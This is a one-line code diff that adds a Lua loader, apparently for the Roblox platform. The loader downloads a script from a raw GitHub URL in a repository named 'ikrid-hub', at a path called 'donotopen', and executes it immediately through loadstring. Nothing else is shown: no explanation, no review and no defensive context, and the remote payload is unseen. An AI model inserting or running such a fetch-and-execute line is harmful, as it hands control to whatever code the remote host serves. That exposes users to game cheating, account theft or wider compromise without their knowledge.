@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IkridEstine/ikrid-hub/main/donotopen"))()
